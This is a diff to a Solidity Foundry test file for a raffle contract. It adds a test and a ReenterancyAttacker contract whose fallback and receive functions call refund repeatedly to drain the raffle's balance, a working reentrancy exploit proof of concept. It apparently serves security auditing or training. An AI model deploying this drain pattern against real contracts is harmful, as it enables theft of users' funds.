@@ -249,4 +249,70 @@ contract PuppyRaffleTest is Test {
 
         assert(gasUsedFirst500 < gasUsedLast500);
     }
+
+    function test_reenterancyAttack() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReenterancyAttacker attackerContract = new ReenterancyAttacker(
+            puppyRaffle
+        );
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract)
+            .balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        // executing attack
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("starting attacker balance", startingAttackContractBalance);
+        console.log("starting puppyRaffle balance", startingPuppyRaffleBalance);
+
+        console.log(
+            "ending attacker balance",
+            address(attackerContract).balance
+        );
+        console.log("ending puppyRaffle balance", address(puppyRaffle).balance);
+    }
+}
+
+contract ReenterancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 enteranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        enteranceFee = _puppyRaffle.entranceFee();
+    }
+
+    //enter raffle
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: enteranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _steal() internal {
+        if (address(puppyRaffle).balance >= enteranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _steal();
+    }
+
+    receive() external payable {
+        _steal();
+    }
 }
